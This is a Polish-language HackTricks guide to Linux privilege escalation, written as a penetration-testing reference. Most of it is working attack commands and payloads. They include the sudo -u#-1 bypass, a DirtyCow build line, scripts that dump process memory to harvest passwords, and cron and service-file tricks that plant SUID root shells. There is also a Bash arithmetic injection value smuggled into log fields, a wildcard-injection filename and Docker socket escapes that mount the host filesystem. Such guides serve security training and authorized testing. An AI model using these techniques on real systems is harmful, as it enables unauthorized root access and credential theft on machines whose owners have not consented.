# Linux Privilege Escalation

{{#include ../../banners/hacktricks-training.md}}

## Informacje o systemie

### Informacje o systemie operacyjnym

Zacznijmy od zebrania informacji o uruchomionym systemie.
```bash
(cat /proc/version || uname -a ) 2>/dev/null
lsb_release -a 2>/dev/null # old, not by default on many systems
cat /etc/os-release 2>/dev/null # universal on modern systems
```
### Path

Jeśli **masz uprawnienia do zapisu w dowolnym folderze znajdującym się w zmiennej `PATH`**, możesz być w stanie przejąć niektóre biblioteki lub binaria:
```bash
echo $PATH
```
### Informacje o środowisku

Czy w zmiennych środowiskowych znajdują się interesujące informacje, hasła lub klucze API?
```bash
(env || set) 2>/dev/null
```
### Kernel exploits

Sprawdź wersję kernela i czy istnieje jakiś exploit, którego można użyć do eskalacji uprawnień
```bash
cat /proc/version
uname -a
searchsploit "Linux Kernel"
```
Możesz znaleźć dobrą listę podatnych kerneli oraz kilka już **compiled exploits** tutaj: [https://github.com/lucyoa/kernel-exploits](https://github.com/lucyoa/kernel-exploits) i [exploitdb sploits](https://gitlab.com/exploit-database/exploitdb-bin-sploits).\
Inne strony, gdzie możesz znaleźć niektóre **compiled exploits**: [https://github.com/bwbwbwbw/linux-exploit-binaries](https://github.com/bwbwbwbw/linux-exploit-binaries), [https://github.com/Kabot/Unix-Privilege-Escalation-Exploits-Pack](https://github.com/Kabot/Unix-Privilege-Escalation-Exploits-Pack)

Aby wyodrębnić wszystkie wersje podatnych kerneli z tej strony możesz zrobić:
```bash
curl https://raw.githubusercontent.com/lucyoa/kernel-exploits/master/README.md 2>/dev/null | grep "Kernels: " | cut -d ":" -f 2 | cut -d "<" -f 1 | tr -d "," | tr ' ' '\n' | grep -v "^\d\.\d$" | sort -u -r | tr '\n' ' '
```
Narzędzia, które mogą pomóc w wyszukiwaniu kernel exploits to:

[linux-exploit-suggester.sh](https://github.com/mzet-/linux-exploit-suggester)\
[linux-exploit-suggester2.pl](https://github.com/jondonas/linux-exploit-suggester-2)\
[linuxprivchecker.py](http://www.securitysift.com/download/linuxprivchecker.py) (execute IN victim,only checks exploits for kernel 2.x)

Zawsze **wyszukaj wersję jądra w Google**, być może twoja wersja jądra jest wymieniona w jakimś kernel exploit i wtedy będziesz mieć pewność, że exploit jest ważny.

### CVE-2016-5195 (DirtyCow)

Linux Privilege Escalation - Linux Kernel <= 3.19.0-73.8
```bash
# make dirtycow stable
echo 0 > /proc/sys/vm/dirty_writeback_centisecs
g++ -Wall -pedantic -O2 -std=c++11 -pthread -o dcow 40847.cpp -lutil
https://github.com/dirtycow/dirtycow.github.io/wiki/PoCs
https://github.com/evait-security/ClickNRoot/blob/master/1/exploit.c
```
### Wersja Sudo

Na podstawie podatnych wersji sudo, które pojawiają się w:
```bash
searchsploit sudo
```
Możesz sprawdzić, czy wersja sudo jest podatna, używając polecenia grep.
```bash
sudo -V | grep "Sudo ver" | grep "1\.[01234567]\.[0-9]\+\|1\.8\.1[0-9]\*\|1\.8\.2[01234567]"
```
#### sudo < v1.8.28

Od @sickrov
```
sudo -u#-1 /bin/bash
```
### Dmesg signature verification failed

Sprawdź **smasher2 box of HTB** w poszukiwaniu **przykładu**, jak można wykorzystać tę vuln.
```bash
dmesg 2>/dev/null | grep "signature"
```
### Więcej enumeracji systemu
```bash
date 2>/dev/null #Date
(df -h || lsblk) #System stats
lscpu #CPU info
lpstat -a 2>/dev/null #Printers info
```
## Wymień możliwe środki obrony

### AppArmor
```bash
if [ `which aa-status 2>/dev/null` ]; then
aa-status
elif [ `which apparmor_status 2>/dev/null` ]; then
apparmor_status
elif [ `ls -d /etc/apparmor* 2>/dev/null` ]; then
ls -d /etc/apparmor*
else
echo "Not found AppArmor"
fi
```
### Grsecurity
```bash
((uname -r | grep "\-grsec" >/dev/null 2>&1 || grep "grsecurity" /etc/sysctl.conf >/dev/null 2>&1) && echo "Yes" || echo "Not found grsecurity")
```
### PaX
```bash
(which paxctl-ng paxctl >/dev/null 2>&1 && echo "Yes" || echo "Not found PaX")
```
### Execshield
```bash
(grep "exec-shield" /etc/sysctl.conf || echo "Not found Execshield")
```
### SElinux
```bash
(sestatus 2>/dev/null || echo "Not found sestatus")
```
### ASLR
```bash
cat /proc/sys/kernel/randomize_va_space 2>/dev/null
#If 0, not enabled
```
## Docker Breakout

Jeśli znajdujesz się wewnątrz docker container możesz spróbować z niego uciec:

{{#ref}}
docker-security/
{{#endref}}

## Drives

Sprawdź **co jest zamontowane i odmontowane**, gdzie i dlaczego. Jeśli coś jest odmontowane, możesz spróbować to zamontować i sprawdzić, czy nie ma prywatnych informacji
```bash
ls /dev 2>/dev/null | grep -i "sd"
cat /etc/fstab 2>/dev/null | grep -v "^#" | grep -Pv "\W*\#" 2>/dev/null
#Check if credentials in fstab
grep -E "(user|username|login|pass|password|pw|credentials)[=:]" /etc/fstab /etc/mtab 2>/dev/null
```
## Przydatne oprogramowanie

Wymień przydatne binaries
```bash
which nmap aws nc ncat netcat nc.traditional wget curl ping gcc g++ make gdb base64 socat python python2 python3 python2.7 python2.6 python3.6 python3.7 perl php ruby xterm doas sudo fetch docker lxc ctr runc rkt kubectl 2>/dev/null
```
Sprawdź także, czy **jakikolwiek kompilator jest zainstalowany**. Jest to przydatne, jeśli musisz użyć jakiegoś kernel exploit, ponieważ zaleca się skompilować go na maszynie, na której będziesz go używać (lub na podobnej).
```bash
(dpkg --list 2>/dev/null | grep "compiler" | grep -v "decompiler\|lib" 2>/dev/null || yum list installed 'gcc*' 2>/dev/null | grep gcc 2>/dev/null; which gcc g++ 2>/dev/null || locate -r "/gcc[0-9\.-]\+$" 2>/dev/null | grep -v "/doc/")
```
### Zainstalowane podatne oprogramowanie

Sprawdź **wersję zainstalowanych pakietów i usług**. Być może jest jakaś stara wersja Nagios (na przykład), która mogłaby zostać wykorzystana do escalating privileges…\
Zaleca się ręczne sprawdzenie wersji bardziej podejrzanego zainstalowanego oprogramowania.
```bash
dpkg -l #Debian
rpm -qa #Centos
```
If you have SSH access to the machine you could also use **openVAS** to check for outdated and vulnerable software installed inside the machine.

> [!NOTE] > _Zwróć uwagę, że te polecenia wyświetlą dużo informacji, które w większości będą bezużyteczne, dlatego zaleca się użycie aplikacji takich jak OpenVAS lub podobnych, które sprawdzą, czy któraś z zainstalowanych wersji oprogramowania jest podatna na znane exploits_

## Procesy

Sprawdź, **jakie procesy** są uruchamiane i zweryfikuj, czy któryś proces nie ma **więcej uprawnień, niż powinien** (może tomcat uruchamiany przez root?)
```bash
ps aux
ps -ef
top -n 1
```
Zawsze sprawdzaj, czy nie działają [**electron/cef/chromium debuggers** running, you could abuse it to escalate privileges](electron-cef-chromium-debugger-abuse.md). **Linpeas** detect those by checking the `--inspect` parameter inside the command line of the process.\
Również **sprawdź swoje uprawnienia wobec binarek procesów**, być może możesz nadpisać którąś.

### Monitorowanie procesów

Możesz użyć narzędzi takich jak [**pspy**](https://github.com/DominicBreuker/pspy) do monitorowania procesów. Może to być bardzo przydatne do identyfikacji podatnych procesów uruchamianych często lub gdy spełniony jest określony zestaw warunków.

### Pamięć procesu

Niektóre usługi na serwerze zapisują **credentials in clear text inside the memory**.\
Zazwyczaj będziesz potrzebować **root privileges** aby odczytać pamięć procesów należących do innych użytkowników, więc jest to zwykle bardziej użyteczne, gdy jesteś już root i chcesz odkryć więcej credentials.\
Jednak pamiętaj, że **as a regular user you can read the memory of the processes you own**.

> [!WARNING]
> Note that nowadays most machines **don't allow ptrace by default** which means that you cannot dump other processes that belong to your unprivileged user.
>
> The file _**/proc/sys/kernel/yama/ptrace_scope**_ controls the accessibility of ptrace:
>
> - **kernel.yama.ptrace_scope = 0**: wszystkie procesy mogą być debugowane, o ile mają ten sam uid. To klasyczny sposób działania ptrace.
> - **kernel.yama.ptrace_scope = 1**: tylko proces macierzysty może być debugowany.
> - **kernel.yama.ptrace_scope = 2**: tylko administrator może używać ptrace, ponieważ wymagana jest capability CAP_SYS_PTRACE.
> - **kernel.yama.ptrace_scope = 3**: żadne procesy nie mogą być śledzone za pomocą ptrace. Po ustawieniu wymagana jest ponowna inicjalizacja (reboot), aby ponownie włączyć ptrace.

#### GDB

Jeśli masz dostęp do pamięci usługi FTP (na przykład), możesz pobrać Heap i przeszukać w nim credentials.
```bash
gdb -p <FTP_PROCESS_PID>
(gdb) info proc mappings
(gdb) q
(gdb) dump memory /tmp/mem_ftp <START_HEAD> <END_HEAD>
(gdb) q
strings /tmp/mem_ftp #User and password
```
#### GDB Script
```bash:dump-memory.sh
#!/bin/bash
#./dump-memory.sh <PID>
grep rw-p /proc/$1/maps \
| sed -n 's/^\([0-9a-f]*\)-\([0-9a-f]*\) .*$/\1 \2/p' \
| while read start stop; do \
gdb --batch --pid $1 -ex \
"dump memory $1-$start-$stop.dump 0x$start 0x$stop"; \
done
```
#### /proc/$pid/maps & /proc/$pid/mem

Dla danego identyfikatora procesu (PID) **maps pokazują, jak pamięć jest odwzorowana w wirtualnej przestrzeni adresowej tego procesu**; pokazują też **uprawnienia każdego zmapowanego regionu**. Pseudoplik **mem** **udostępnia samą pamięć procesu**. Z pliku **maps** wiemy, które **regiony pamięci są czytelne** i jakie mają offsety. Wykorzystujemy te informacje, aby **przesunąć wskaźnik w pliku mem i zrzucić wszystkie czytelne regiony** do pliku.
```bash
procdump()
(
cat /proc/$1/maps | grep -Fv ".so" | grep " 0 " | awk '{print $1}' | ( IFS="-"
while read a b; do
dd if=/proc/$1/mem bs=$( getconf PAGESIZE ) iflag=skip_bytes,count_bytes \
skip=$(( 0x$a )) count=$(( 0x$b - 0x$a )) of="$1_mem_$a.bin"
done )
cat $1*.bin > $1.dump
rm $1*.bin
)
```
#### /dev/mem

`/dev/mem` zapewnia dostęp do systemowej **pamięci fizycznej**, a nie pamięci wirtualnej. Do wirtualnej przestrzeni adresowej jądra można uzyskać dostęp za pomocą /dev/kmem.\
Zazwyczaj, `/dev/mem` jest czytelny tylko dla **root** i grupy **kmem**.
```
strings /dev/mem -n10 | grep -i PASS
```
### ProcDump dla linux

ProcDump to wersja dla Linux klasycznego narzędzia ProcDump z pakietu Sysinternals dla Windows. Pobierz ją z [https://github.com/Sysinternals/ProcDump-for-Linux](https://github.com/Sysinternals/ProcDump-for-Linux)
```
procdump -p 1714

ProcDump v1.2 - Sysinternals process dump utility
Copyright (C) 2020 Microsoft Corporation. All rights reserved. Licensed under the MIT license.
Mark Russinovich, Mario Hewardt, John Salem, Javid Habibi
Monitors a process and writes a dump file when the process meets the
specified criteria.

Process:		sleep (1714)
CPU Threshold:		n/a
Commit Threshold:	n/a
Thread Threshold:		n/a
File descriptor Threshold:		n/a
Signal:		n/a
Polling interval (ms):	1000
Threshold (s):	10
Number of Dumps:	1
Output directory for core dumps:	.

Press Ctrl-C to end monitoring without terminating the process.

[20:20:58 - WARN]: Procdump not running with elevated credentials. If your uid does not match the uid of the target process procdump will not be able to capture memory dumps
[20:20:58 - INFO]: Timed:
[20:21:00 - INFO]: Core dump 0 generated: ./sleep_time_2021-11-03_20:20:58.1714
```
### Narzędzia

Aby zrzucić pamięć procesu możesz użyć:

- [**https://github.com/Sysinternals/ProcDump-for-Linux**](https://github.com/Sysinternals/ProcDump-for-Linux)
- [**https://github.com/hajzer/bash-memory-dump**](https://github.com/hajzer/bash-memory-dump) (root) - \_Możesz ręcznie usunąć wymagania root i zrzucić pamięć procesu należącego do Ciebie
- Script A.5 from [**https://www.delaat.net/rp/2016-2017/p97/report.pdf**](https://www.delaat.net/rp/2016-2017/p97/report.pdf) (wymagany root)

### Poświadczenia z pamięci procesu

#### Przykład ręczny

Jeśli stwierdzisz, że proces authenticator jest uruchomiony:
```bash
ps -ef | grep "authenticator"
root      2027  2025  0 11:46 ?        00:00:00 authenticator
```
Możesz dump the process (zobacz wcześniejsze sekcje, aby znaleźć różne sposoby dump the memory of a process) i przeszukać memory w poszukiwaniu credentials:
```bash
./dump-memory.sh 2027
strings *.dump | grep -i password
```
#### mimipenguin

Narzędzie [https://github.com/huntergregal/mimipenguin](https://github.com/huntergregal/mimipenguin) będzie **kraść poświadczenia w postaci jawnego tekstu z pamięci** oraz z niektórych **dobrze znanych plików**. Wymaga uprawnień root, aby działać poprawnie.

| Funkcja                                           | Nazwa procesu         |
| ------------------------------------------------- | -------------------- |
| Hasło GDM (Kali Desktop, Debian Desktop)         | gdm-password         |
| Gnome Keyring (Ubuntu Desktop, ArchLinux Desktop) | gnome-keyring-daemon |
| LightDM (Ubuntu Desktop)                          | lightdm              |
| VSFTPd (aktywne połączenia FTP)                   | vsftpd               |
| Apache2 (aktywne sesje HTTP Basic Auth)           | apache2              |
| OpenSSH (aktywne sesje SSH - użycie sudo)         | sshd:                |

#### Wzorce wyszukiwania/[truffleproc](https://github.com/controlplaneio/truffleproc)
```bash
# un truffleproc.sh against your current Bash shell (e.g. $$)
./truffleproc.sh $$
# coredumping pid 6174
Reading symbols from od...
Reading symbols from /usr/lib/systemd/systemd...
Reading symbols from /lib/systemd/libsystemd-shared-247.so...
Reading symbols from /lib/x86_64-linux-gnu/librt.so.1...
[...]
# extracting strings to /tmp/tmp.o6HV0Pl3fe
# finding secrets
# results in /tmp/tmp.o6HV0Pl3fe/results.txt
```
## Zadania zaplanowane/Cron jobs

### Crontab UI (alseambusher) running as root – web-based scheduler privesc

Jeśli panel webowy “Crontab UI” (alseambusher/crontab-ui) działa jako root i jest powiązany tylko z loopback, nadal możesz uzyskać do niego dostęp przez SSH local port-forwarding i utworzyć uprzywilejowane zadanie w celu eskalacji.

Typowy łańcuch
- Odnajdź port dostępny tylko na loopback (np. 127.0.0.1:8000) i realm Basic-Auth za pomocą `ss -ntlp` / `curl -v localhost:8000`
- Znajdź poświadczenia w artefaktach operacyjnych:
- Kopie zapasowe/skrypty z `zip -P <password>`
- jednostka systemd ujawniająca `Environment="BASIC_AUTH_USER=..."`, `Environment="BASIC_AUTH_PWD=..."`
- Utwórz tunel i zaloguj się:
```bash
ssh -L 9001:localhost:8000 user@target
# browse http://localhost:9001 and authenticate
```
- Utwórz zadanie z wysokimi uprawnieniami i uruchom natychmiast (tworzy SUID shell):
```bash
# Name: escalate
# Command:
cp /bin/bash /tmp/rootshell && chmod 6777 /tmp/rootshell
```
- Użyj tego:
```bash
/tmp/rootshell -p   # root shell
```
Wzmacnianie bezpieczeństwa
- Nie uruchamiaj Crontab UI jako root; ogranicz do dedykowanego użytkownika i minimalnych uprawnień
- Nasłuchuj na localhost i dodatkowo ogranicz dostęp przez firewall/VPN; nie używaj ponownie haseł
- Unikaj osadzania secrets w unit files; użyj secret stores lub EnvironmentFile dostępnego tylko dla root
- Włącz audyt/logowanie dla wykonywania zadań na żądanie

Sprawdź, czy któreś zaplanowane zadanie jest podatne. Być może możesz wykorzystać skrypt uruchamiany przez root (wildcard vuln? czy możesz modyfikować pliki, których używa root? użyć symlinks? utworzyć konkretne pliki w katalogu używanym przez root?).
```bash
crontab -l
ls -al /etc/cron* /etc/at*
cat /etc/cron* /etc/at* /etc/anacrontab /var/spool/cron/crontabs/root 2>/dev/null | grep -v "^#"
```
### Cron path

Na przykład w pliku _/etc/crontab_ możesz znaleźć zmienną PATH: _PATH=**/home/user**:/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin_

(_Zauważ, że użytkownik "user" ma uprawnienia do zapisu w /home/user_)

Jeśli w tym crontabie użytkownik root próbuje wykonać jakąś komendę lub skrypt bez ustawienia PATH. Na przykład: _\* \* \* \* root overwrite.sh_\
Wtedy możesz uzyskać root shell używając:
```bash
echo 'cp /bin/bash /tmp/bash; chmod +s /tmp/bash' > /home/user/overwrite.sh
#Wait cron job to be executed
/tmp/bash -p #The effective uid and gid to be set to the real uid and gid
```
### Cron używający skryptu z wildcard (Wildcard Injection)

Jeśli skrypt uruchamiany przez root ma “**\***” w poleceniu, możesz to wykorzystać do wywołania nieoczekiwanych zachowań (np. privesc). Przykład:
```bash
rsync -a *.sh rsync://host.back/src/rbd #You can create a file called "-e sh myscript.sh" so the script will execute our script
```
**Jeśli wildcard jest poprzedzony ścieżką taką jak** _**/some/path/\***_ **, nie jest podatny (nawet** _**./\***_ **nie jest).**

Read the following page for more wildcard exploitation tricks:


{{#ref}}
wildcards-spare-tricks.md
{{#endref}}


### Bash arithmetic expansion injection w parserach logów cron

Bash wykonuje parameter expansion i command substitution przed oceną arytmetyczną w ((...)), $((...)) i let. Jeśli root cron/parser odczytuje niezaufane pola logów i podaje je do kontekstu arytmetycznego, atakujący może wstrzyknąć command substitution $(...), które wykona się jako root, gdy cron uruchomi się.

- Why it works: W Bash rozszerzenia zachodzą w tej kolejności: parameter/variable expansion, command substitution, arithmetic expansion, a następnie word splitting i pathname expansion. Zatem wartość taka jak `$(/bin/bash -c 'id > /tmp/pwn')0` jest najpierw podstawiana (uruchamiając polecenie), a pozostała liczba `0` jest użyta w arytmetyce, dzięki czemu skrypt kontynuuje bez błędów.

- Typical vulnerable pattern:
```bash
#!/bin/bash
# Example: parse a log and "sum" a count field coming from the log
while IFS=',' read -r ts user count rest; do
# count is untrusted if the log is attacker-controlled
(( total += count ))     # or: let "n=$count"
done < /var/www/app/log/application.log
```

- Exploitation: Spraw, by tekst kontrolowany przez atakującego został zapisany w parsowanym logu tak, aby pole wyglądające na liczbowe zawierało command substitution i kończyło się cyfrą. Upewnij się, że twoje polecenie nie wypisuje nic na stdout (lub przekieruj jego wyjście), aby arytmetyka pozostała poprawna.
```bash
# Injected field value inside the log (e.g., via a crafted HTTP request that the app logs verbatim):
$(/bin/bash -c 'cp /bin/bash /tmp/sh; chmod +s /tmp/sh')0
# When the root cron parser evaluates (( total += count )), your command runs as root.
```

### Nadpisywanie skryptu cron i symlink

If you **możesz zmodyfikować skrypt cron** uruchamiany przez root, możesz bardzo łatwo uzyskać powłokę:
```bash
echo 'cp /bin/bash /tmp/bash; chmod +s /tmp/bash' > </PATH/CRON/SCRIPT>
#Wait until it is executed
/tmp/bash -p
```
Jeśli script uruchamiany przez root używa **katalogu, do którego masz pełny dostęp**, może być przydatne usunięcie tego folderu i **utworzenie symlink wskazującego na inny**, który zawiera script kontrolowany przez Ciebie
```bash
ln -d -s </PATH/TO/POINT> </PATH/CREATE/FOLDER>
```
### Częste cron jobs

Możesz monitorować procesy, aby wyszukać procesy, które są wykonywane co 1, 2 lub 5 minut. Być może możesz to wykorzystać i escalate privileges.

Na przykład, aby **monitorować co 0.1s przez 1 minutę**, **posortować według rzadziej wykonywanych poleceń** i usunąć polecenia, które zostały wykonane najczęściej, możesz zrobić:
```bash
for i in $(seq 1 610); do ps -e --format cmd >> /tmp/monprocs.tmp; sleep 0.1; done; sort /tmp/monprocs.tmp | uniq -c | grep -v "\[" | sed '/^.\{200\}./d' | sort | grep -E -v "\s*[6-9][0-9][0-9]|\s*[0-9][0-9][0-9][0-9]"; rm /tmp/monprocs.tmp;
```
**Możesz też użyć** [**pspy**](https://github.com/DominicBreuker/pspy/releases) (będzie monitorować i wyświetlać każdy proces, który się uruchamia).

### Niewidoczne cron jobs

Możliwe jest utworzenie cronjob poprzez **putting a carriage return after a comment** (bez znaku newline), i cron job będzie działać. Przykład (zwróć uwagę na znak carriage return):
```bash
#This is a comment inside a cron config file\r* * * * * echo "Surprise!"
```
## Usługi

### Pliki _.service_ z zapisem

Sprawdź, czy możesz zapisać jakikolwiek plik `.service`, jeśli tak, możesz go **zmodyfikować**, aby **wykonywał** Twój **backdoor, gdy** usługa zostanie **uruchomiona**, **zrestartowana** lub **zatrzymana** (może być konieczny reboot maszyny).\
Na przykład umieść swój backdoor w pliku .service używając **`ExecStart=/tmp/script.sh`**

### Pliki binarne usług z zapisem

Pamiętaj, że jeśli masz **uprawnienia zapisu do binarek uruchamianych przez usługi**, możesz je zmienić na backdoory, więc gdy usługi zostaną ponownie uruchomione, backdoory zostaną wykonane.

### systemd PATH - Ścieżki względne

Możesz zobaczyć PATH używany przez **systemd** za pomocą:
```bash
systemctl show-environment
```
Jeśli okaże się, że możesz **zapisywać** w którymkolwiek z folderów na tej ścieżce, możesz być w stanie **escalate privileges**. Musisz wyszukać **ścieżek względnych używanych w plikach konfiguracji usług** takich jak:
```bash
ExecStart=faraday-server
ExecStart=/bin/sh -ec 'ifup --allow=hotplug %I; ifquery --state %I'
ExecStop=/bin/sh "uptux-vuln-bin3 -stuff -hello"
```
Następnie utwórz **executable** o **tej samej nazwie co binarka z relatywnej ścieżki** wewnątrz folderu PATH systemd, do którego masz prawa zapisu, i gdy serwis zostanie poproszony o wykonanie podatnej akcji (**Start**, **Stop**, **Reload**), twój **backdoor zostanie wykonany** (użytkownicy bez uprawnień zazwyczaj nie mogą start/stop usług, ale sprawdź czy możesz użyć `sudo -l`).

**Dowiedz się więcej o usługach za pomocą `man systemd.service`.**

## **Timery**

**Timery** to pliki jednostek systemd, których nazwa kończy się na `**.timer**`, które kontrolują pliki `**.service**` lub zdarzenia. **Timery** mogą być używane jako alternatywa dla cron, ponieważ mają wbudowane wsparcie dla zdarzeń opartych na czasie kalendarzowym i zdarzeń monotonicznych oraz mogą być uruchamiane asynchronicznie.

Możesz wyenumerować wszystkie timery za pomocą:
```bash
systemctl list-timers --all
```
### Timery z możliwością zapisu

Jeśli możesz zmodyfikować timer, możesz sprawić, że uruchomi on istniejące jednostki systemd.unit (np. `.service` lub `.target`).
```bash
Unit=backdoor.service
```
W dokumentacji można przeczytać, czym jest Unit:

> Jednostka, która ma zostać aktywowana, gdy ten timer wygaśnie. Argumentem jest nazwa jednostki, której sufiks nie jest ".timer". Jeśli nie zostanie określone, ta wartość domyślnie wskazuje na service o tej samej nazwie co timer unit, z wyjątkiem sufiksu. (Zobacz wyżej.) Zaleca się, aby nazwa jednostki, która jest aktywowana, i nazwa jednostki timer były identyczne, z wyjątkiem sufiksu.

Therefore, to abuse this permission you would need to:

- Find some systemd unit (like a `.service`) that is **uruchamia binarkę, do której można zapisywać**
- Find some systemd unit that is **uruchamia względną ścieżkę** and you have **prawa zapisu** over the **systemd PATH** (to impersonate that executable)

**Dowiedz się więcej o timerach za pomocą `man systemd.timer`.**

### **Włączanie timera**

Aby włączyć timer potrzebujesz uprawnień root i wykonać:
```bash
sudo systemctl enable backu2.timer
Created symlink /etc/systemd/system/multi-user.target.wants/backu2.timer → /lib/systemd/system/backu2.timer.
```
Uwaga: **timer** jest **aktywowany** przez utworzenie symlinku do niego w `/etc/systemd/system/<WantedBy_section>.wants/<name>.timer`

## Gniazda

Unix Domain Sockets (UDS) umożliwiają **komunikację między procesami** na tej samej lub różnych maszynach w modelach klient‑serwer. Wykorzystują standardowe pliki deskryptorów Unix do komunikacji między komputerami i są konfigurowane przez pliki `.socket`.

Gniazda można konfigurować za pomocą plików `.socket`.

**Dowiedz się więcej o gniazdach za pomocą `man systemd.socket`.** W tym pliku można skonfigurować kilka ciekawych parametrów:

- `ListenStream`, `ListenDatagram`, `ListenSequentialPacket`, `ListenFIFO`, `ListenSpecial`, `ListenNetlink`, `ListenMessageQueue`, `ListenUSBFunction`: Te opcje różnią się między sobą, ale w skrócie służą do **wskazania miejsca nasłuchu** gniazda (ścieżka pliku AF_UNIX, IPv4/6 i/lub numer portu do nasłuchiwania itp.)
- `Accept`: Przyjmuje argument boolean. Jeśli **true**, tworzona jest **instancja usługi dla każdego nadchodzącego połączenia** i przekazywany jest do niej tylko socket połączenia. Jeśli **false**, wszystkie nasłuchujące sockety są **przekazywane do uruchomionej jednostki service**, a dla wszystkich połączeń tworzona jest tylko jedna jednostka service. Ta wartość jest ignorowana dla gniazd datagramowych i FIFO, gdzie pojedyncza jednostka service bezwarunkowo obsługuje cały ruch przychodzący. **Domyślnie false**. Ze względów wydajnościowych zaleca się implementować nowe demony w sposób odpowiedni dla `Accept=no`.
- `ExecStartPre`, `ExecStartPost`: Przyjmują jedną lub więcej linii poleceń, które są **wykonywane przed** lub **po** utworzeniu i powiązaniu (bound) nasłuchujących **socketów**/FIFO. Pierwszy token linii poleceń musi być absolutną ścieżką pliku, po której następują argumenty procesu.
- `ExecStopPre`, `ExecStopPost`: Dodatkowe **polecenia**, które są **wykonywane przed** lub **po** zamknięciu i usunięciu nasłuchujących **socketów**/FIFO.
- `Service`: Określa nazwę jednostki **service**, którą **aktywować** przy **ruchu przychodzącym**. To ustawienie jest dozwolone tylko dla gniazd z Accept=no. Domyślnie wskazuje usługę o tej samej nazwie co socket (z odpowiednio zmienionym sufiksem). W większości przypadków użycie tej opcji nie powinno być konieczne.

### Writable .socket files

Jeśli znajdziesz **zapisowalny** plik `.socket`, możesz **dodać** na początku sekcji `[Socket]` coś w stylu: `ExecStartPre=/home/kali/sys/backdoor` i backdoor zostanie uruchomiony przed utworzeniem socketu. W związku z tym **prawdopodobnie będziesz musiał poczekać na reboot maszyny.**\
_Uwaga: system musi używać tej konfiguracji pliku socket, w przeciwnym razie backdoor nie zostanie uruchomiony_

### Writable sockets

Jeśli **zidentyfikujesz dowolne zapisowalne gniazdo** (_mówimy tu teraz o Unix Sockets, a nie o plikach konfiguracyjnych `.socket`_), to **możesz komunikować się** z tym gniazdem i być może wykorzystać podatność.

### Enumerate Unix Sockets
```bash
netstat -a -p --unix
```
### Surowe połączenie
```bash
#apt-get install netcat-openbsd
nc -U /tmp/socket  #Connect to UNIX-domain stream socket
nc -uU /tmp/socket #Connect to UNIX-domain datagram socket

#apt-get install socat
socat - UNIX-CLIENT:/dev/socket #connect to UNIX-domain socket, irrespective of its type
```
**Przykład eksploatacji:**


{{#ref}}
socket-command-injection.md
{{#endref}}

### HTTP sockets

Zauważ, że mogą istnieć pewne **sockets listening for HTTP** requests (_Nie mam na myśli plików .socket, lecz plików pełniących rolę unix sockets_). Możesz to sprawdzić poleceniem:
```bash
curl --max-time 2 --unix-socket /pat/to/socket/files http:/index
```
Jeśli gniazdo **odpowiada na żądanie HTTP**, wtedy możesz **komunikować się** z nim i być może **wykorzystać jakąś podatność**.

### Zapisowalny Docker socket

Docker socket, często znajdujący się pod `/var/run/docker.sock`, jest krytycznym plikiem, który powinien być zabezpieczony. Domyślnie jest zapisywalny przez użytkownika `root` i członków grupy `docker`. Posiadanie prawa zapisu do tego socketu może prowadzić do privilege escalation. Poniżej znajduje się rozbicie, jak można to zrobić oraz alternatywne metody, jeśli Docker CLI nie jest dostępne.

#### **Privilege Escalation with Docker CLI**

Jeśli masz prawo zapisu do Docker socket, możesz escalate privileges, używając następujących poleceń:
```bash
docker -H unix:///var/run/docker.sock run -v /:/host -it ubuntu chroot /host /bin/bash
docker -H unix:///var/run/docker.sock run -it --privileged --pid=host debian nsenter -t 1 -m -u -n -i sh
```
Te polecenia pozwalają uruchomić kontener z uprawnieniami root do systemu plików hosta.

#### **Używanie Docker API bezpośrednio**

W przypadkach, gdy Docker CLI nie jest dostępne, Docker socket można nadal manipulować za pomocą Docker API i poleceń `curl`.

1.  **List Docker Images:** Pobierz listę dostępnych obrazów.

```bash
curl -XGET --unix-socket /var/run/docker.sock http://localhost/images/json
```

2.  **Create a Container:** Wyślij żądanie utworzenia kontenera, które montuje katalog root systemu hosta.

```bash
curl -XPOST -H "Content-Type: application/json" --unix-socket /var/run/docker.sock -d '{"Image":"<ImageID>","Cmd":["/bin/sh"],"DetachKeys":"Ctrl-p,Ctrl-q","OpenStdin":true,"Mounts":[{"Type":"bind","Source":"/","Target":"/host_root"}]}' http://localhost/containers/create
```

Start the newly created container:

```bash
curl -XPOST --unix-socket /var/run/docker.sock http://localhost/containers/<NewContainerID>/start
```

3.  **Attach to the Container:** Użyj `socat`, aby nawiązać połączenie z kontenerem, umożliwiając wykonywanie poleceń w jego wnętrzu.

```bash
socat - UNIX-CONNECT:/var/run/docker.sock
POST /containers/<NewContainerID>/attach?stream=1&stdin=1&stdout=1&stderr=1 HTTP/1.1
Host:
Connection: Upgrade
Upgrade: tcp
```

Po skonfigurowaniu połączenia `socat` możesz wykonywać polecenia bezpośrednio w kontenerze z uprawnieniami root do systemu plików hosta.

### Inne

Zauważ, że jeśli masz uprawnienia zapisu do docker socket, ponieważ należysz do grupy **`docker`**, masz [**more ways to escalate privileges**](interesting-groups-linux-pe/index.html#docker-group). Jeśli [**docker API is listening in a port** you can also be able to compromise it](../../network-services-pentesting/2375-pentesting-docker.md#compromising).

Sprawdź **more ways to break out from docker or abuse it to escalate privileges** w:


{{#ref}}
docker-security/
{{#endref}}

## Containerd (ctr) privilege escalation

Jeśli odkryjesz, że możesz użyć polecenia **`ctr`**, przeczytaj następującą stronę, ponieważ **you may be able to abuse it to escalate privileges**:


{{#ref}}
containerd-ctr-privilege-escalation.md
{{#endref}}

## **RunC** privilege escalation

Jeśli odkryjesz, że możesz użyć polecenia **`runc`**, przeczytaj następującą stronę, ponieważ **you may be able to abuse it to escalate privileges**:


{{#ref}}
runc-privilege-escalation.md
{{#endref}}

## **D-Bus**

D-Bus jest zaawansowanym **inter-Process Communication (IPC) system**, który umożliwia aplikacjom efektywną interakcję i wymianę danych. Zaprojektowany z myślą o nowoczesnym systemie Linux, oferuje solidne ramy dla różnych form komunikacji między aplikacjami.

System jest wszechstronny, wspiera podstawowe IPC, które usprawnia wymianę danych między procesami, przypominając **enhanced UNIX domain sockets**. Ponadto pomaga w rozgłaszaniu zdarzeń lub sygnałów, ułatwiając bezproblemową integrację komponentów systemu. Na przykład sygnał od demona Bluetooth o przychodzącym połączeniu może spowodować wyciszenie odtwarzacza muzyki, poprawiając doświadczenie użytkownika. Dodatkowo D-Bus obsługuje system zdalnych obiektów, upraszczając żądania usług i wywołania metod między aplikacjami, usprawniając procesy, które wcześniej były skomplikowane.

